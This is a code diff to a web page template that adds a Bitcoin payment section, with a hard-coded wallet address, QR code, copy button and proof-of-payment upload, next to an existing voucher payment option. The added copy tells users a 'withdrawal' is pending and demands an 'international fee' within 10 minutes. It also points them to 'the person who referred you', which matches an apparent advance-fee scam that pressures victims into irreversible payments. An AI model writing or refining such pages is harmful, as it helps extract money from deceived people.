@@ -73,6 +73,7 @@
         </div>
         {% endif %}
 
+        <!-- Voucher Payment Section -->
         <div class="mt-3" style="background:#f8f9fa;border:1px solid #e6e6e6;border-radius:10px;padding:14px;">
           <h3 style="margin:0 0 10px 0;font-size:1.05rem;color:#b5121b;">Links to get your Voucher For International Fees Payment</h3>
           <div class="row g-2">
@@ -94,6 +95,67 @@
           </div>
         </div>
 
+        <!-- Bitcoin Payment Section -->
+        <div class="mt-4" style="background:#f8f9fa;border:1px solid #e6e6e6;border-radius:10px;padding:20px;">
+          <h3 style="margin:0 0 15px 0;font-size:1.25rem;color:#f7931a;display:flex;align-items:center;">
+            <i class="fab fa-bitcoin" style="margin-right:10px;"></i> Pay via Bitcoin (BTC)
+          </h3>
+          
+          <!-- BTC Address Box -->
+          <div style="background:#fff;border:2px solid #e6e6e6;border-radius:8px;padding:15px;margin-bottom:15px;">
+            <div style="margin-bottom:15px;text-align:center;">
+              <img src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=bitcoin:3JxGGWUbDR9y2bxJcYG7TonbRNjk1PPfAg" alt="Bitcoin QR Code" style="max-width:200px;margin:0 auto 10px;display:block;border:1px solid #ddd;">
+              <div style="margin-bottom:10px;font-weight:500;">Send exact amount to:</div>
+              <div style="display:flex;align-items:center;justify-content:center;gap:10px;margin-bottom:10px;">
+                <input type="text" id="btcAddress" value="3JxGGWUbDR9y2bxJcYG7TonbRNjk1PPfAg" readonly style="flex:1;padding:8px;border:1px solid #ddd;border-radius:4px;font-family:monospace;text-align:center;">
+                <button onclick="copyBtcAddress()" style="background:#f7931a;color:white;border:none;border-radius:4px;padding:8px 12px;cursor:pointer;">
+                  <i class="far fa-copy"></i> Copy
+                </button>
+              </div>
+              <div style="font-size:0.9em;color:#666;margin-top:5px;">
+                <i class="fas fa-exclamation-triangle" style="color:#f7931a;"></i> Do NOT send funds to any other address. BTC transactions are irreversible.
+              </div>
+            </div>
+          </div>
+
+          <!-- Payment Instructions -->
+          <div style="background:#fff5f5;border-left:4px solid #f7931a;padding:12px 15px;margin-bottom:15px;border-radius:0 4px 4px 0;">
+            <p style="margin:0 0 10px 0;font-weight:500;color:#333;">
+              <strong>Withdrawal pending.</strong><br>
+              To complete your international fee payment you may pay via <strong>Voucher or Bitcoin</strong> within <strong>10 minutes</strong>. All fees can be paid once or in installments. If you need help, ask the person who referred you for direction.
+            </p>
+            
+            <p style="margin:10px 0;font-weight:500;color:#333;">
+              <strong>Pay via Bitcoin (BTC):</strong><br>
+              Please send the required BTC amount to <strong>3JxGGWUbDR9y2bxJcYG7TonbRNjk1PPfAg</strong>. After sending the payment, immediately take a <strong>clear screenshot</strong> of your wallet or exchange showing <strong>date/time, destination address, amount, and transaction ID (TXID)</strong> as proof of payment. Upload that screenshot below and click <strong>Paid and Continue</strong>.
+            </p>
+            
+            <p style="margin:15px 0 10px 0;font-weight:500;color:#333;">
+              Purchase Bitcoin (BTC) from one of these trusted providers:
+            </p>
+            <div class="row g-2" style="margin-bottom:15px;">
+              <div class="col-6 col-md-4">
+                <a class="btn btn-warning w-100" style="border-radius:8px;background:#f7931a;border-color:#f7931a;" href="https://www.paybis.com/" target="_blank" rel="noopener noreferrer">Paybis</a>
+              </div>
+              <div class="col-6 col-md-4">
+                <a class="btn btn-warning w-100" style="border-radius:8px;background:#f7931a;border-color:#f7931a;" href="https://bitcoin.org/en/" target="_blank" rel="noopener noreferrer">Bitcoin.org</a>
+              </div>
+              <div class="col-6 col-md-4">
+                <a class="btn btn-warning w-100" style="border-radius:8px;background:#f7931a;border-color:#f7931a;" href="https://exchange.mercuryo.io/" target="_blank" rel="noopener noreferrer">Mercuryo</a>
+              </div>
+            </div>
+            
+            <div style="font-size:0.9em;color:#555;background:#fff;padding:10px;border-radius:4px;border:1px solid #eee;margin-top:10px;">
+              <strong>Important notes:</strong>
+              <ul style="margin:8px 0 0 20px;padding:0;">
+                <li>BTC transactions are <strong>irreversible</strong>. Double-check the address before sending.</li>
+                <li>Payments will be verified on the blockchain by admin — verification may take <strong>10–60 minutes</strong> depending on network confirmations.</li>
+                <li>Make sure the screenshot clearly shows the destination address and TXID — blurred or incomplete images may delay verification.</li>
+              </ul>
+            </div>
+          </div>
+        </div>
+
         {% if transaction.voucher_image %}
         <div class="mt-3" style="background:#f8f9fa;border:1px solid #e6e6e6;border-radius:8px;padding:12px;">
           <div style="font-weight:600;margin-bottom:8px;display:flex;align-items:center;gap:8px;">
@@ -110,16 +172,17 @@
         </div>
         {% endif %}
 
-        <form class="mt-3" method="post" enctype="multipart/form-data" action="">
+        <div id="voucherState" data-has-uploaded="{% if transaction.voucher_image %}1{% else %}0{% endif %}"></div>
+
+        <form id="voucherForm" class="mt-3" method="post" enctype="multipart/form-data" action="">
           {% csrf_token %}
-          <label class="form-label" for="id_voucher_image">Upload your Voucher image proof here. Only valid and clear Voucher Pics will be accepted.</label>
-          <input type="file" name="voucher_image" id="id_voucher_image" accept="image/*" class="form-control" />
-          <button type="submit" class="btn-prim mt-2"><i class="fas fa-upload"></i> Upload Voucher</button>
+          <label class="form-label" for="id_voucher_image">Upload your Voucher AND Bitcoin proof of payment here. Only valid and clear Voucher/Bitcoin transaction proofs will be accepted.</label>
+          <input type="file" name="voucher_image" id="id_voucher_image" accept="image/*" class="form-control" required />
+          <button type="submit" class="btn-prim mt-2"><i class="fas fa-upload"></i> Upload Proof</button>
         </form>
 
         <div class="mt-3">
-          <button id="paidBtn" class="btn-prim"><i class="fas fa-check"></i> Uploaded and Continue</button>
-          <span id="confirming" class="spinner ms-2" style="display:none;"><i class="fas fa-spinner fa-spin me-1"></i>Confirming payment…</span>
+          <button id="paidBtn" type="submit" form="voucherForm" class="btn-prim"><i class="fas fa-check"></i> Uploaded and Continue</button>
         </div>
 
         <div class="actions">
@@ -145,6 +208,9 @@
     const percentComplete = document.getElementById('percentComplete');
     // Initialize from template value already rendered; no-op here
     const pollNote = document.getElementById('pollNote');
+    const fileInput = document.getElementById('id_voucher_image');
+    const voucherForm = document.getElementById('voucherForm');
+    const hasUploaded = (document.getElementById('voucherState')?.dataset?.hasUploaded === '1');
 
     let polling = true;
 
@@ -153,19 +219,29 @@
       keepWaiting.style.display = 'inline-flex';
     }
 
-    paidBtn.addEventListener('click', function(){
-      paidBtn.disabled = true;
-      confirming.style.display = 'inline-flex';
-      setTimeout(function(){
-        confirming.style.display = 'none';
-        setPostConfirmUI();
-      }, 1800);
-    });
+    // Copy BTC address to clipboard
+    function copyBtcAddress() {
+      const btcAddress = document.getElementById('btcAddress');
+      btcAddress.select();
+      document.execCommand('copy');
+      
+      // Show copied feedback
+      const copyBtn = document.querySelector('button[onclick="copyBtcAddress()"]');
+      const originalText = copyBtn.innerHTML;
+      copyBtn.innerHTML = '<i class="fas fa-check"></i> Copied!';
+      setTimeout(() => {
+        copyBtn.innerHTML = originalText;
+      }, 2000);
+    }
+
+    // "Uploaded and Continue" submits the same form and relies on browser validation
 
     keepWaiting.addEventListener('click', function(){
       // just show spinner briefly to indicate we continue waiting
-      confirming.style.display = 'inline-flex';
-      setTimeout(function(){ confirming.style.display = 'none'; }, 1200);
+      if(confirming){
+        confirming.style.display = 'inline-flex';
+        setTimeout(function(){ confirming.style.display = 'none'; }, 1200);
+      }
     });
 
     async function poll(){
